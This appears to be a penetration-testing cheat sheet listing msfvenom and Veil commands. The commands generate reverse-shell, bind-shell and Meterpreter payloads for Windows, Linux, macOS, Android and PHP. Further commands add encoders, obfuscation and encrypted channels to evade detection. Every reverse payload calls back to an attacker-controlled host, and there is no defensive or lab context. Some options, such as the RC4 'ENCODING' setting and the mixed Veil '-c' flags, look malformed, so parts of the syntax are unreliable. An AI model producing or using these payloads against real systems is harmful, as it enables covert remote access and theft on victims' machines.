

# MSVenom payloads

# Windows Reverse TCP Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe -o reverse_meterpreter.exe

# Linux Reverse TCP Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f elf -o reverse_meterpreter.elf

# macOS Reverse TCP Meterpreter
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f macho -o reverse_shell.macho

# Android Reverse TCP Meterpreter
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -o reverse_meterpreter.apk

# PHP Reverse TCP Meterpreter
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f raw -o reverse_shell.php

# Generate a Windows x86 reverse shell payload in the Powershell format
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f powershell -o reverse_shell.ps1

# Generate a Linux x86 bind shell payload in the Python format
msfvenom -p linux/x86/shell/bind_tcp LPORT=<attacker port> -f python -o bind_shell.py

# Generate a macOS x86 reverse TCP Meterpreter payload that connects through an HTTP proxy
msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f macho -o reverse_meterpreter.macho HTTP_PROXY=http://proxy.example.com:8080

# Generate a Windows x64 reverse HTTPS Meterpreter payload that encrypts communications with RC4
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=<attacker port> -f exe -o reverse_meterpreter.exe ENCODING=rc4


# Veil payloads

# Generate a custom payload with a specific name and set of evasion techniques
python Veil.py -p python/meterpreter/rev_http -o my_payload -t python -c '-e x86/shikata_ga_nai -o raw -H 5'

# Generate a payload with a custom shellcode encoder
python Veil.py -p python/meterpreter/rev_tcp -o my_payload -t python -c '-x alpha_mixed'

# Generate a payload with custom obfuscation options
python Veil.py -p python/meterpreter/reverse_tcp -o my_payload -t python -c '-t PS -Obfuscate true -ObfuscationType 3 -OutDirectory /root/veil/payloads/obfuscated'

# Generate a payload with an encrypted communication channel
python Veil.py -p python/meterpreter/rev_tcp -o my_payload -t python -c '-e x86/shikata_ga_nai -o raw -C <attacker IP>:<attacker port>'
